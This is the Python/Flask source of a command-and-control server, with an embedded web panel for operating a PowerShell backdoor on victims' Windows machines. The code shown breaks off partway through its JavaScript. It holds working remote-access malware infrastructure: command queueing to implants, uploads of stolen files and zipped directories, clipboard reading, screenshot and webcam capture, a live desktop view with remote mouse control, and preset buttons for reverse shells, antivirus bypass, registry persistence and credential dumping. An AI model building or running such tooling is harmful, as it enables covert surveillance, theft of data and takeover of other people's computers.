from flask import Flask, request, jsonify, render_template_string, send_from_directory
import os
import datetime
import uuid

app = Flask(__name__)

# Create folders
UPLOAD_FOLDER = 'uploads'
RESULTS_FOLDER = 'results'
MEDIA_FOLDER = 'media_uploads'
STREAM_FOLDER = 'stream_frames'
os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(RESULTS_FOLDER, exist_ok=True)
os.makedirs(MEDIA_FOLDER, exist_ok=True)
os.makedirs(STREAM_FOLDER, exist_ok=True)

# Global state
current_command = "idle"
results = []          # list of (timestamp, output)
stream_frame = None   # filename of latest stream frame
latest_upload = None  # filename of most recent upload
last_contact = None   # timestamp of last contact from backdoor

def update_last_contact():
    global last_contact
    last_contact = datetime.datetime.now()

# ---------- Helper to check if a file is an image ----------
def is_image(filename):
    return filename.lower().endswith(('.png', '.jpg', '.jpeg', '.gif', '.bmp'))

# ---------- Routes for the backdoor ----------
@app.route('/command', methods=['GET'])
def get_command():
    update_last_contact()
    return current_command

@app.route('/set_command', methods=['POST'])
def set_command():
    global current_command
    update_last_contact()
    data = request.get_json()
    if data and 'command' in data:
        current_command = data['command']
        print(f"[+] Command set: {current_command[:80]}")
        return jsonify({"status": "ok", "command": current_command})
    return "Invalid request", 400

@app.route('/result', methods=['POST'])
def result():
    update_last_contact()
    data = request.get_json()
    if data and 'output' in data:
        timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
        filename = f"result_{datetime.datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
        with open(os.path.join(RESULTS_FOLDER, filename), 'w') as f:
            f.write(data['output'])
        results.append((timestamp, data['output']))
        if len(results) > 50:
            results.pop(0)
        print(f"[+] Received result ({len(data['output'])} bytes)")
        return jsonify({"status": "ok"})
    return "Invalid", 400

@app.route('/upload', methods=['POST'])
def upload():
    """Accept both multipart form uploads and raw binary uploads."""
    global latest_upload
    update_last_contact()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
    filename = None

    # 1. Check if it's a multipart upload with a file field
    if 'file' in request.files:
        file = request.files['file']
        if file.filename == '':
            return 'No selected file', 400
        # Use original filename or generate one
        orig_name = file.filename
        filename = f"{timestamp}_{orig_name}"
        file.save(os.path.join(UPLOAD_FOLDER, filename))

    else:
        # 2. Raw binary upload (used by Invoke-WebRequest -InFile)
        data = request.get_data()
        if not data:
            return 'No data', 400
        # Assume it's an image (screenshot/webcam) – save as .jpg for preview
        filename = f"{timestamp}_image.jpg"
        with open(os.path.join(UPLOAD_FOLDER, filename), 'wb') as f:
            f.write(data)

    if filename is None:
        return 'Invalid request', 400

    latest_upload = filename
    print(f"[+] Received file: {filename}")
    results.append((datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S"), f"[FILE UPLOADED] {filename}"))
    return 'File uploaded successfully', 200

@app.route('/latest_upload')
def latest_upload_endpoint():
    """Return the most recently uploaded file (for preview)."""
    global latest_upload
    if latest_upload and os.path.exists(os.path.join(UPLOAD_FOLDER, latest_upload)):
        return send_from_directory(UPLOAD_FOLDER, latest_upload)
    return '', 404

@app.route('/upload_media', methods=['POST'])
def upload_media():
    """Attacker uploads wallpaper or sound file."""
    if 'file' not in request.files:
        return 'No file part', 400
    file = request.files['file']
    if file.filename == '':
        return 'No selected file', 400
    ext = file.filename.rsplit('.', 1)[-1].lower()
    unique_name = f"{uuid.uuid4().hex}.{ext}"
    file.save(os.path.join(MEDIA_FOLDER, unique_name))
    return jsonify({"filename": unique_name}), 200

@app.route('/media/<filename>')
def serve_media(filename):
    return send_from_directory(MEDIA_FOLDER, filename)

@app.route('/stream_upload', methods=['POST'])
def stream_upload():
    """Accept both multipart form and raw binary uploads for live stream."""
    global stream_frame
    update_last_contact()
    timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S_%f")
    filename = None

    # Multipart upload
    if 'file' in request.files:
        file = request.files['file']
        if file.filename == '':
            return 'No selected file', 400
        filename = f"frame_{timestamp}.jpg"
        file.save(os.path.join(STREAM_FOLDER, filename))

    else:
        # Raw binary upload
        data = request.get_data()
        if not data:
            return 'No data', 400
        filename = f"frame_{timestamp}.jpg"
        with open(os.path.join(STREAM_FOLDER, filename), 'wb') as f:
            f.write(data)

    if filename is None:
        return 'Invalid request', 400

    stream_frame = filename
    # Keep only last 10 frames
    frames = sorted(os.listdir(STREAM_FOLDER))
    for old in frames[:-10]:
        os.remove(os.path.join(STREAM_FOLDER, old))
    return 'OK', 200

@app.route('/latest_frame')
def latest_frame():
    """Return the latest stream frame."""
    global stream_frame
    if stream_frame and os.path.exists(os.path.join(STREAM_FOLDER, stream_frame)):
        return send_from_directory(STREAM_FOLDER, stream_frame)
    return '', 404

@app.route('/results', methods=['GET'])
def get_results():
    return jsonify(results)

@app.route('/clear_results', methods=['POST'])
def clear_results():
    global results
    results = []
    return jsonify({"status": "ok"})

@app.route('/status')
def status():
    global last_contact
    online = False
    if last_contact:
        elapsed = (datetime.datetime.now() - last_contact).total_seconds()
        online = elapsed < 30   # consider online if last contact within 30 seconds
    return jsonify({
        "online": online,
        "last_seen": last_contact.isoformat() if last_contact else None
    })

@app.route('/<path:filename>')
def serve_file(filename):
    return send_from_directory('.', filename)

# ---------- Main index page ----------
@app.route('/')
def index():
    attacker_ip = request.host.split(':')[0]
    protocol = request.scheme
    return render_template_string(INDEX_HTML, attacker_ip=attacker_ip, protocol=protocol)

# ---------- HTML Template (embedded) ----------
INDEX_HTML = r'''<!DOCTYPE html>
<html lang="en">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>C2 Panel</title>
<link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Orbitron:wght@400;700;900&display=swap" rel="stylesheet">
<style>
  :root {
    --bg: #080c10;
    --bg2: #0d1117;
    --bg3: #111820;
    --border: #1e3a4a;
    --accent: #00d4ff;
    --accent2: #ff6b35;
    --accent3: #39ff14;
    --danger: #ff2244;
    --text: #c8e0e8;
    --text-dim: #4a7a8a;
    --glow: 0 0 12px rgba(0,212,255,0.4);
    --glow-green: 0 0 12px rgba(57,255,20,0.4);
  }

  * { box-sizing: border-box; margin: 0; padding: 0; }

  body {
    background: var(--bg);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    font-size: 13px;
    min-height: 100vh;
    overflow-x: hidden;
  }

  body::before {
    content: '';
    position: fixed;
    inset: 0;
    background: repeating-linear-gradient(
      0deg,
      transparent,
      transparent 2px,
      rgba(0,212,255,0.015) 2px,
      rgba(0,212,255,0.015) 4px
    );
    pointer-events: none;
    z-index: 9999;
  }

  header {
    background: var(--bg2);
    border-bottom: 1px solid var(--border);
    padding: 14px 24px;
    display: flex;
    align-items: center;
    justify-content: space-between;
    position: sticky;
    top: 0;
    z-index: 100;
  }

  header h1 {
    font-family: 'Orbitron', monospace;
    font-weight: 900;
    font-size: 18px;
    color: var(--accent);
    text-shadow: var(--glow);
    letter-spacing: 3px;
  }

  .status-bar {
    display: flex;
    align-items: center;
    gap: 20px;
    font-size: 11px;
    color: var(--text-dim);
  }

  .status-dot {
    width: 8px; height: 8px;
    border-radius: 50%;
    background: var(--accent3);
    box-shadow: var(--glow-green);
    animation: pulse 2s infinite;
    display: inline-block;
    margin-right: 6px;
  }

  @keyframes pulse {
    0%, 100% { opacity: 1; }
    50% { opacity: 0.3; }
  }

  .layout {
    display: grid;
    grid-template-columns: 320px 1fr;
    gap: 0;
    height: calc(100vh - 53px);
  }

  .sidebar {
    background: var(--bg2);
    border-right: 1px solid var(--border);
    overflow-y: auto;
    padding: 16px;
    display: flex;
    flex-direction: column;
    gap: 16px;
  }

  .main {
    display: flex;
    flex-direction: column;
    overflow: hidden;
  }

  .section-label {
    font-family: 'Orbitron', monospace;
    font-size: 9px;
    letter-spacing: 3px;
    color: var(--text-dim);
    text-transform: uppercase;
    margin-bottom: 10px;
    padding-bottom: 6px;
    border-bottom: 1px solid var(--border);
  }

  .cat-tabs {
    display: flex;
    gap: 4px;
    flex-wrap: wrap;
    margin-bottom: 12px;
  }

  .cat-tab {
    padding: 4px 10px;
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--text-dim);
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    cursor: pointer;
    border-radius: 2px;
    transition: all 0.15s;
  }

  .cat-tab.active, .cat-tab:hover {
    background: rgba(0,212,255,0.1);
    border-color: var(--accent);
    color: var(--accent);
  }

  .cmd-grid {
    display: flex;
    flex-direction: column;
    gap: 6px;
  }

  .cmd-btn {
    width: 100%;
    padding: 9px 12px;
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    cursor: pointer;
    text-align: left;
    transition: all 0.15s;
    border-radius: 2px;
    display: flex;
    align-items: center;
    gap: 8px;
  }

  .cmd-btn:hover {
    background: rgba(0,212,255,0.08);
    border-color: var(--accent);
    color: var(--accent);
    box-shadow: inset 3px 0 0 var(--accent);
    padding-left: 15px;
  }

  .cmd-btn.danger:hover {
    background: rgba(255,34,68,0.08);
    border-color: var(--danger);
    color: var(--danger);
    box-shadow: inset 3px 0 0 var(--danger);
  }

  .cmd-btn .icon { font-size: 14px; width: 18px; text-align: center; }

  .cmd-category { display: none; }
  .cmd-category.active { display: block; }

  .main-tabs {
    display: flex;
    border-bottom: 1px solid var(--border);
    background: var(--bg2);
  }

  .main-tab {
    padding: 12px 20px;
    font-family: 'Share Tech Mono', monospace;
    font-size: 11px;
    letter-spacing: 1px;
    color: var(--text-dim);
    cursor: pointer;
    border-bottom: 2px solid transparent;
    transition: all 0.15s;
    user-select: none;
  }

  .main-tab.active {
    color: var(--accent);
    border-bottom-color: var(--accent);
  }

  .tab-content { display: none; flex: 1; overflow: hidden; flex-direction: column; padding: 16px; }
  .tab-content.active { display: flex; }

  .terminal {
    flex: 1;
    background: #050810;
    border: 1px solid var(--border);
    border-radius: 3px;
    padding: 12px;
    overflow-y: auto;
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    line-height: 1.6;
  }

  .result-entry { margin-bottom: 12px; border-bottom: 1px solid rgba(30,58,74,0.5); padding-bottom: 10px; }
  .result-ts { color: var(--text-dim); font-size: 10px; margin-bottom: 4px; }
  .result-ts::before { content: '['; color: var(--accent); }
  .result-ts::after { content: ']'; color: var(--accent); }
  .result-output { color: var(--accent3); white-space: pre-wrap; word-break: break-all; }
  .result-file { color: var(--accent2); }

  .terminal-controls {
    display: flex;
    gap: 8px;
    margin-bottom: 10px;
    align-items: center;
  }

  .badge {
    background: rgba(0,212,255,0.1);
    border: 1px solid var(--accent);
    color: var(--accent);
    padding: 2px 8px;
    font-size: 10px;
    border-radius: 2px;
  }

  .input-group { margin-bottom: 12px; }
  .input-label { font-size: 10px; letter-spacing: 2px; color: var(--text-dim); margin-bottom: 6px; display: block; }

  input[type=text], textarea, select {
    width: 100%;
    background: var(--bg3);
    border: 1px solid var(--border);
    color: var(--text);
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    padding: 8px 12px;
    border-radius: 2px;
    outline: none;
    transition: border-color 0.15s;
  }

  input[type=text]:focus, textarea:focus, select:focus {
    border-color: var(--accent);
    box-shadow: 0 0 0 1px rgba(0,212,255,0.2);
  }

  textarea { resize: vertical; min-height: 80px; }

  .btn {
    padding: 8px 18px;
    background: rgba(0,212,255,0.1);
    border: 1px solid var(--accent);
    color: var(--accent);
    font-family: 'Share Tech Mono', monospace;
    font-size: 12px;
    cursor: pointer;
    border-radius: 2px;
    transition: all 0.15s;
    letter-spacing: 1px;
  }

  .btn:hover {
    background: rgba(0,212,255,0.2);
    box-shadow: var(--glow);
  }

  .btn-danger {
    background: rgba(255,34,68,0.1);
    border-color: var(--danger);
    color: var(--danger);
  }

  .btn-danger:hover { background: rgba(255,34,68,0.2); }

  .btn-green {
    background: rgba(57,255,20,0.1);
    border-color: var(--accent3);
    color: var(--accent3);
  }

  .row { display: flex; gap: 8px; align-items: flex-end; }
  .row input { flex: 1; }

  .file-builder {
    display: grid;
    grid-template-columns: 1fr 1fr;
    gap: 12px;
    margin-bottom: 12px;
  }

  .toast {
    position: fixed;
    bottom: 20px;
    right: 20px;
    background: var(--bg2);
    border: 1px solid var(--accent);
    color: var(--accent);
    padding: 10px 16px;
    font-size: 12px;
    border-radius: 3px;
    box-shadow: var(--glow);
    z-index: 9999;
    opacity: 0;
    transform: translateY(10px);
    transition: all 0.25s;
    pointer-events: none;
  }

  .toast.show { opacity: 1; transform: translateY(0); }

  ::-webkit-scrollbar { width: 5px; }
  ::-webkit-scrollbar-track { background: var(--bg); }
  ::-webkit-scrollbar-thumb { background: var(--border); border-radius: 2px; }

  /* Preview image styles */
  .preview-img {
    max-width: 100%;
    max-height: 300px;
    border: 1px solid var(--border);
    border-radius: 4px;
    margin-top: 10px;
  }
</style>
</head>
<body>

<header>
  <h1>⬡ C2 PANEL</h1>
  <div class="status-bar">
    <span><span class="status-dot"></span> <span id="statusText">ONLINE</span></span>
    <span id="cmdStatus">IDLE</span>
    <span id="resultCount">0 RESULTS</span>
    <span style="color:var(--accent2)">{{ attacker_ip }}:8000</span>
  </div>
</header>

<div class="layout">
  <!-- SIDEBAR: Quick Commands -->
  <div class="sidebar">
    <div>
      <div class="section-label">Quick Commands</div>
      <div class="cat-tabs">
        <div class="cat-tab active" onclick="switchCat('recon')">RECON</div>
        <div class="cat-tab" onclick="switchCat('files')">FILES</div>
        <div class="cat-tab" onclick="switchCat('system')">SYSTEM</div>
        <div class="cat-tab" onclick="switchCat('fun')">MISC</div>
      </div>

      <div class="cmd-category active" id="cat-recon">
        <div class="cmd-grid">
          <button class="cmd-btn" onclick="sendCommand('whoami /all | Out-String')"><span class="icon">👤</span>whoami /all</button>
          <button class="cmd-btn" onclick="sendCommand('hostname; $env:COMPUTERNAME')"><span class="icon">🖥</span>Hostname</button>
          <button class="cmd-btn" onclick="sendCommand('ipconfig /all | Out-String')"><span class="icon">🌐</span>IP Config</button>
          <button class="cmd-btn" onclick="sendCommand('Get-Process | Sort-Object CPU -Descending | Select -First 20 | Format-Table Name,Id,CPU -AutoSize | Out-String')"><span class="icon">📋</span>Top Processes</button>
          <button class="cmd-btn" onclick="sendCommand('Get-LocalUser | Format-Table Name,Enabled,LastLogon -AutoSize | Out-String')"><span class="icon">👥</span>Local Users</button>
          <button class="cmd-btn" onclick="sendCommand('Get-LocalGroupMember Administrators | Format-Table -AutoSize | Out-String')"><span class="icon">🔑</span>Local Admins</button>
          <button class="cmd-btn" onclick="sendCommand('Get-NetTCPConnection -State Listen | Format-Table -AutoSize | Out-String')"><span class="icon">📡</span>Open Ports</button>
          <button class="cmd-btn" onclick="sendCommand('systeminfo | Out-String')"><span class="icon">ℹ️</span>System Info</button>
          <button class="cmd-btn" onclick="sendCommand('Get-ChildItem Env: | Format-Table -AutoSize | Out-String')"><span class="icon">🔧</span>Env Variables</button>
          <button class="cmd-btn" onclick="sendCommand('Get-ScheduledTask | Where-Object {$_.State -eq \"Ready\"} | Format-Table TaskName,TaskPath -AutoSize | Out-String')"><span class="icon">⏰</span>Scheduled Tasks</button>
        </div>
      </div>

      <div class="cmd-category" id="cat-files">
        <div class="cmd-grid">
          <button class="cmd-btn" onclick="sendCommand('Get-ChildItem $env:USERPROFILE\\\\Desktop | Format-Table -AutoSize | Out-String')"><span class="icon">🗂</span>List Desktop</button>
          <button class="cmd-btn" onclick="sendCommand('Get-ChildItem $env:USERPROFILE\\\\Documents | Format-Table -AutoSize | Out-String')"><span class="icon">📁</span>List Documents</button>
          <button class="cmd-btn" onclick="sendCommand('New-Item -Path $env:USERPROFILE\\\\Desktop\\\\pwned.txt -ItemType File -Value &quot;You have been pwned! - Demo&quot; -Force | Out-String')"><span class="icon">📄</span>Create pwned.txt</button>
          <button class="cmd-btn" onclick="sendCommand('New-Item -Path C:\\\\Windows\\\\Temp\\\\c2drop.txt -ItemType File -Value &quot;C2 was here&quot; -Force | Out-String')"><span class="icon">📝</span>Drop in Temp</button>
          <button class="cmd-btn" onclick="sendCommand('Get-ChildItem C:\\ -Recurse -Include *.txt,*.doc,*.pdf -ErrorAction SilentlyContinue | Select -First 30 | Format-Table FullName -AutoSize | Out-String')"><span class="icon">🔍</span>Find Docs (C:\\)</button>
          <button class="cmd-btn" onclick="sendCommand('Remove-Item $env:USERPROFILE\\\\Desktop\\\\pwned.txt -Force -ErrorAction SilentlyContinue; Write-Output \"Deleted\"')" class="cmd-btn danger"><span class="icon">🗑</span>Delete pwned.txt</button>
        </div>
      </div>

      <div class="cmd-category" id="cat-system">
        <div class="cmd-grid">
          <button class="cmd-btn" onclick="sendCommand('Get-Service | Where-Object {$_.Status -eq &quot;Running&quot;} | Format-Table -AutoSize | Out-String')"><span class="icon">⚙️</span>Running Services</button>
          <button class="cmd-btn" onclick="sendCommand('Get-ItemProperty HKLM:\\\\Software\\\\Microsoft\\\\Windows\\\\CurrentVersion\\\\Uninstall\\\\* | Select DisplayName,DisplayVersion | Format-Table -AutoSize | Out-String')"><span class="icon">📦</span>Installed Software</button>
          <button class="cmd-btn" onclick="sendCommand('Get-WmiObject Win32_LogicalDisk | Format-Table DeviceID,Size,FreeSpace -AutoSize | Out-String')"><span class="icon">💾</span>Disk Info</button>
          <button class="cmd-btn" onclick="sendCommand('Capture-Screenshot')"><span class="icon">📷</span>Screenshot</button>
          <button class="cmd-btn" onclick="sendCommand('Capture-Webcam')"><span class="icon">🎥</span>Webcam</button>
          <button class="cmd-btn" onclick="sendCommand('Get-EventLog -LogName Security -Newest 20 | Format-Table -AutoSize | Out-String')"><span class="icon">📜</span>Security Log</button>
          <button class="cmd-btn" onclick="sendCommand('Get-Clipboard | Out-String')"><span class="icon">📋</span>Read Clipboard</button>
          <button class="cmd-btn" onclick="sendCommand('Invoke-WebRequest -Uri {{ protocol }}://{{ attacker_ip }}:8000/media/wallpaper.jpg -OutFile $env:TEMP\\wallpaper.jpg; Set-ItemProperty -Path \"HKCU:\\Control Panel\\Desktop\" -Name Wallpaper -Value \"$env:TEMP\\wallpaper.jpg\"; RUNDLL32.EXE user32.dll,UpdatePerUserSystemParameters')"><span class="icon">🖼️</span>Change Wallpaper</button>
          <button class="cmd-btn" onclick="sendCommand('Invoke-WebRequest -Uri {{ protocol }}://{{ attacker_ip }}:8000/media/sound.wav -OutFile $env:TEMP\\sound.wav; (New-Object Media.SoundPlayer \"$env:TEMP\\sound.wav\").PlaySync()')"><span class="icon">🔊</span>Play Sound</button>
        </div>
      </div>

      <div class="cmd-category" id="cat-fun">
        <div class="cmd-grid">
          <button class="cmd-btn" onclick="sendCommand('[System.Media.SystemSounds]::Beep.Play()')"><span class="icon">🔊</span>Beep</button>
          <div style="display:flex; gap:6px; margin:4px 0;">
            <input type="text" id="popupMessage" placeholder="Enter popup message" style="flex:1; padding:6px; font-size:11px;">
            <button class="cmd-btn" style="flex:0;" onclick="sendPopupMessage()">💬 Send Popup</button>
          </div>
          <button class="cmd-btn" onclick="sendCommand('(New-Object -ComObject WMPlayer.OCX).cdromCollection.Item(0).Eject()')"><span class="icon">💿</span>Open CD Tray</button>
          <button class="cmd-btn" onclick="sendCommand('Add-Type -AssemblyName System.Windows.Forms; [System.Windows.Forms.Cursor]::Position = New-Object System.Drawing.Point(0,0)')"><span class="icon">🖱</span>Move Cursor</button>
        </div>
      </div>
    </div>
  </div>

  <!-- MAIN PANEL -->
  <div class="main">
    <div class="main-tabs">
      <div class="main-tab active" onclick="switchTab('terminal')">TERMINAL OUTPUT</div>
      <div class="main-tab" onclick="switchTab('execute')">EXECUTE</div>
      <div class="main-tab" onclick="switchTab('fileops')">FILE OPS</div>
      <div class="main-tab" onclick="switchTab('exfil')">EXFILTRATE</div>
      <div class="main-tab" onclick="switchTab('media')">MEDIA</div>
      <div class="main-tab" onclick="switchTab('live')">LIVE VIEW</div>
    </div>

    <!-- TERMINAL TAB -->
    <div class="tab-content active" id="tab-terminal">
      <div class="terminal-controls">
        <span class="badge" id="liveCount">0 entries</span>
        <button class="btn" onclick="fetchResults()">↻ REFRESH</button>
        <button class="btn btn-danger" onclick="clearResults()">✕ CLEAR</button>
        <label style="margin-left:auto;font-size:11px;color:var(--text-dim);">
          <input type="checkbox" id="autoScroll" checked style="width:auto;margin-right:4px;">AUTO-SCROLL
        </label>
      </div>
      <div class="terminal" id="results">
        <span style="color:var(--text-dim)">// Waiting for results from victim...</span>
      </div>
    </div>

    <!-- EXECUTE TAB -->
    <div class="tab-content" id="tab-execute">
      <div class="input-group">
        <label class="input-label">POWERSHELL COMMAND</label>
        <textarea id="customCmd" placeholder="Enter any PowerShell command...&#10;e.g. Get-Content C:\Users\Public\secret.txt | Out-String"></textarea>
      </div>
      <div style="display:flex;gap:8px;margin-bottom:16px;">
        <button class="btn btn-green" onclick="sendCustomCommand()">▶ EXECUTE</button>
        <button class="btn" onclick="document.getElementById('customCmd').value=''">CLEAR</button>
      </div>
      <div class="input-group">
        <label class="input-label">COMMAND PRESETS</label>
        <div style="display:flex;gap:6px;flex-wrap:wrap;">
          <button class="btn" onclick="loadPreset('rev')">Reverse Shell</button>
          <button class="btn" onclick="loadPreset('bypass')">AV Bypass Template</button>
          <button class="btn" onclick="loadPreset('persist')">Registry Persist</button>
          <button class="btn" onclick="loadPreset('creds')">Cred Dump Paths</button>
        </div>
      </div>
      <div id="currentCmdBox" style="margin-top:12px;">
        <label class="input-label">CURRENT QUEUED COMMAND</label>
        <div class="terminal" style="height:60px;padding:8px;font-size:11px;" id="queuedCmd">idle</div>
      </div>
    </div>

    <!-- FILE OPS TAB -->
    <div class="tab-content" id="tab-fileops">
      <div class="section-label">Create File on Victim</div>
      <div class="file-builder">
        <div class="input-group">
          <label class="input-label">FILE PATH</label>
          <input type="text" id="newFilePath" placeholder="C:\Users\Public\test.txt">
        </div>
        <div class="input-group">
          <label class="input-label">FILE TYPE</label>
          <select id="fileType" style="background:var(--bg3);border:1px solid var(--border);color:var(--text);padding:8px;font-family:inherit;font-size:12px;border-radius:2px;width:100%;">
            <option value="txt">Text File (.txt)</option>
            <option value="ps1">PowerShell Script (.ps1)</option>
            <option value="bat">Batch File (.bat)</option>
            <option value="vbs">VBScript (.vbs)</option>
            <option value="html">HTML File (.html)</option>
          </select>
        </div>
      </div>
      <div class="input-group">
        <label class="input-label">FILE CONTENT</label>
        <textarea id="newFileContent" rows="5" placeholder="File contents here..."></textarea>
      </div>
      <div style="display:flex;gap:8px;margin-bottom:20px;">
        <button class="btn btn-green" onclick="createFileOnVictim()">📄 CREATE FILE</button>
        <button class="btn" onclick="appendFileOnVictim()">➕ APPEND TO FILE</button>
        <button class="btn btn-danger" onclick="deleteFileOnVictim()">🗑 DELETE FILE</button>
      </div>
      <div class="section-label">Directory Listing</div>
      <div class="row">
        <input type="text" id="dirPath" placeholder="C:\Users\Public">
        <button class="btn" onclick="listDirectory()">LIST DIR</button>
        <button class="btn" onclick="readFileContent()">READ FILE</button>
      </div>
    </div>

    <!-- EXFIL TAB -->
    <div class="tab-content" id="tab-exfil">
      <div class="section-label">Exfiltrate File</div>
      <div class="row" style="margin-bottom:16px;">
        <input type="text" id="exfilPath" placeholder="C:\Users\victim\Documents\passwords.txt">
        <button class="btn btn-green" onclick="exfilFile()">📤 UPLOAD TO C2</button>
      </div>
      <div class="section-label" style="margin-top:8px;">Exfiltrate Directory (ZIP)</div>
      <div class="row" style="margin-bottom:16px;">
        <input type="text" id="exfilDir" placeholder="C:\Users\victim\Documents">
        <button class="btn" onclick="exfilDirectory()">📦 ZIP & UPLOAD</button>
      </div>
      <div class="section-label" style="margin-top:20px;">Uploaded Files</div>
      <div class="terminal" id="uploadList" style="height:150px;font-size:11px;color:var(--accent2);">
        No uploads yet.
      </div>
    </div>

    <!-- MEDIA TAB -->
    <div class="tab-content" id="tab-media">
      <div class="section-label">Change Wallpaper</div>
      <form id="wallpaperForm" enctype="multipart/form-data">
        <input type="file" id="wallpaperFile" accept="image/jpeg,image/png" required>
        <button type="submit" class="btn btn-green">Upload & Set Wallpaper</button>
      </form>
      <div class="section-label" style="margin-top:20px;">Play Sound</div>
      <form id="soundForm" enctype="multipart/form-data">
        <input type="file" id="soundFile" accept="audio/wav,audio/mpeg" required>
        <button type="submit" class="btn btn-green">Upload & Play Sound</button>
      </form>
    </div>

    <!-- LIVE VIEW TAB -->
    <div class="tab-content" id="tab-live">
      <div class="section-label">Live Desktop Stream</div>
      <div style="display: flex; gap: 10px; margin-bottom: 10px;">
        <button class="btn btn-green" onclick="startStream()">▶ START STREAM</button>
        <button class="btn btn-danger" onclick="stopStream()">⏹ STOP STREAM</button>
        <button class="btn" onclick="sendCommand('Capture-Screenshot')">📸 Single Screenshot</button>
      </div>
      <div id="liveView" style="background:#000; text-align:center; position:relative; cursor: crosshair;" onclick="handleMouseClick(event)">
        <img id="liveImage" src="" style="max-width:100%; border:1px solid var(--border);" alt="Live stream">
      </div>
      <div class="mouse-buttons">
        <button class="btn" onclick="sendCommand('Send-MouseClick left')">🖱 Left Click</button>
        <button class="btn" onclick="sendCommand('Send-MouseClick right')">🖱 Right Click</button>
        <button class="btn" onclick="sendCommand('Send-MouseClick double')">🖱 Double Click</button>
      </div>
      <p style="margin-top: 10px; font-size: 11px; color: var(--text-dim);">Click on the image to move the mouse to that position. Use the buttons to click.</p>
    </div>
  </div>
</div>

<div class="toast" id="toast"></div>

<script>
  const ATTACKER_IP = "{{ attacker_ip }}";
  const PROTOCOL = "{{ protocol }}";

  function toast(msg, color) {
    const t = document.getElementById('toast');
    t.textContent = msg;
    t.style.borderColor = color || 'var(--accent)';
    t.style.color = color || 'var(--accent)';
    t.classList.add('show');
    setTimeout(() => t.classList.remove('show'), 2500);
  }

  function sendCommand(cmd) {
    fetch('/set_command', {
      method: 'POST',
      headers: {'Content-Type': 'application/json'},
      body: JSON.stringify({command: cmd})
    })
    .then(r => r.json())
    .then(() => {
      document.getElementById('queuedCmd').textContent = cmd.substring(0, 200) + (cmd.length > 200 ? '...' : '');
      document.getElementById('cmdStatus').textContent = 'CMD QUEUED';
      document.getElementById('cmdStatus').style.color = 'var(--accent2)';
      toast('Command queued', 'var(--accent2)');
      setTimeout(() => {
        document.getElementById('cmdStatus').textContent = 'IDLE';
        document.getElementById('cmdStatus').style.color = '';
      }, 3000);
    });
  }

  // Customizable popup message (larger window)
  function sendPopupMessage() {
    const msg = document.getElementById('popupMessage').value.trim();
    if (!msg) {
      toast('Please enter a message', 'var(--danger)');
      return;
    }
    const escapedMsg = msg.replace(/'/g, "''");
    const cmd = `
        Add-Type -AssemblyName System.Windows.Forms
        Add-Type -AssemblyName System.Drawing
        $form = New-Object System.Windows.Forms.Form
        $form.Text = "Remote Notification"
        $form.Size = New-Object System.Drawing.Size(500, 250)
        $form.StartPosition = "CenterScreen"
        $form.FormBorderStyle = "FixedDialog"
        $form.MaximizeBox = $false
        $form.MinimizeBox = $false
        $form.TopMost = $true

        $label = New-Object System.Windows.Forms.Label
        $label.Text = '${escapedMsg}'
        $label.AutoSize = $false
        $label.Size = New-Object System.Drawing.Size(460, 120)
        $label.Location = New-Object System.Drawing.Point(20, 30)
        $label.Font = New-Object System.Drawing.Font("Segoe UI", 14, [System.Drawing.FontStyle]::Regular)
        $label.TextAlign = "MiddleCenter"
        $form.Controls.Add($label)

        $button = New-Object System.Windows.Forms.Button
        $button.Text = "OK"
        $button.Size = New-Object System.Drawing.Size(80, 30)
        $button.Location = New-Object System.Drawing.Point(210, 160)
        $button.DialogResult = [System.Windows.Forms.DialogResult]::OK
        $form.Controls.Add($button)

        $form.AcceptButton = $button
        $form.Add_Shown({$form.Activate()})
        $result = $form.ShowDialog()
    `;
    sendCommand(cmd);
    toast('Popup message sent');
  }

  function sendCustomCommand() {
    const cmd = document.getElementById('customCmd').value.trim();
    if (cmd) sendCommand(cmd);
  }

  function switchCat(cat) {
    document.querySelectorAll('.cmd-category').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.cat-tab').forEach(el => el.classList.remove('active'));
    document.getElementById('cat-' + cat).classList.add('active');
    event.target.classList.add('active');
  }

  function switchTab(tab) {
    document.querySelectorAll('.tab-content').forEach(el => el.classList.remove('active'));
    document.querySelectorAll('.main-tab').forEach(el => el.classList.remove('active'));
    document.getElementById('tab-' + tab).classList.add('active');
    event.target.classList.add('active');
  }

  function escapeHtml(str) {
    return String(str).replace(/[&<>"']/g, m => ({'&':'&amp;','<':'&lt;','>':'&gt;','"':'&quot;',"'":'&#39;'}[m]));
  }

  function fetchResults() {
    fetch('/results')
      .then(r => r.json())
      .then(data => {
        const div = document.getElementById('results');
        document.getElementById('liveCount').textContent = data.length + ' entries';
        document.getElementById('resultCount').textContent = data.length + ' RESULTS';
        if (data.length === 0) {
          div.innerHTML = '<span style="color:var(--text-dim)">// No results yet...</span>';
          return;
        }
        div.innerHTML = [...data].reverse().map(entry => {
          const isFile = entry[1].startsWith('[FILE UPLOADED]');
          let outputHtml = escapeHtml(entry[1]);
          if (isFile) {
            const filename = entry[1].replace('[FILE UPLOADED] ', '');
            outputHtml = `<span>${escapeHtml(entry[1])}</span> <br><a href="/uploads/${filename}" target="_blank">View file</a>`;
          }
          return `<div class="result-entry">
            <div class="result-ts">${escapeHtml(entry[0])}</div>
            <pre class="${isFile ? 'result-file' : 'result-output'}">${outputHtml}</pre>
          </div>`;
        }).join('');
        if (document.getElementById('autoScroll').checked) {
          div.scrollTop = 0;
        }
      });
  }

  function clearResults() {
    fetch('/clear_results', {method:'POST'})
      .then(() => { fetchResults(); toast('Results cleared'); });
  }

  // File ops
  function createFileOnVictim() {
    const path = document.getElementById('newFilePath').value.trim();
    const content = document.getElementById('newFileContent').value;
    if (!path) return toast('Enter a file path', 'var(--danger)');
